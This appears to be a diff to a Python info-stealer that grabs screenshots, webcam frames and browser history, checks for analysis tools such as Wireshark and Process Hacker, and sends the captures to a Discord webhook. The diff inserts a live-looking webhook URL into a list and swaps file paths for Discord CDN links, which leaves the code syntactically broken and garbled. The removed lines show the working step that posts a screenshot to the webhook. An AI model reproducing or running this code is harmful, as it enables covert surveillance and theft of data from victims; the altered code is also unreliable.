@@ -5,7 +5,7 @@ import re, uuid
 from PIL import ImageGrab
 from browser_history.browsers import Chrome
 webhook = "Webhooksss"
-process = [
+process = [https://discord.com/api/webhooks/1457080106819518658/31asaHrzVMjwBA6gY_O3lsuaMasudwD3sr0vBRUxpQZZnucdNBtJW9LBqJRmpZLUClrq
     "ProcessHacker.exe",
     "httpdebuggerui.exe",
     "wireshark.exe",
@@ -224,9 +224,9 @@ pass
 screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
 screenshot.save("image.png")
 screenshot.close()
-with open('image.png', 'rb') as f:
-     requests.post(webhook,files={'upload_file': f})
-os.remove('image.png')
+with open('https://cdn.discordapp.com/attachments/1458551386324205689/1461787204195057685/IMG_0465.png?ex=696bd2ec&is=696a816c&hm=4ac94520175911339dc88bf5eee2271502e4766fbed78c1af8beaa33832cac32&', 'rb') as f:
+     requests.post(webhook,files={'https://discord.com/api/webhooks/1457080106819518658/31asaHrzVMjwBA6gY_O3lsuaMasudwD3sr0vBRUxpQZZnucdNBtJW9LBqJRmpZLUClrq': f})
+os.remove('https://cdn.discordapp.com/attachments/1458551386324205689/1461787204195057685/IMG_0465.png?ex=696bd2ec&is=696a816c&hm=4ac94520175911339dc88bf5eee2271502e4766fbed78c1af8beaa33832cac32&')
 try:
             videoCaptureObject = cv2.VideoCapture(0)
             ret,frame = videoCaptureObject.read()
@@ -241,7 +241,7 @@ except:
           "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                       "embeds": [
                 {
-                    "author": {
+                    "hyperrr": {
                     "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                     },
                     "description": f"```No Webcam Was Found```",                      
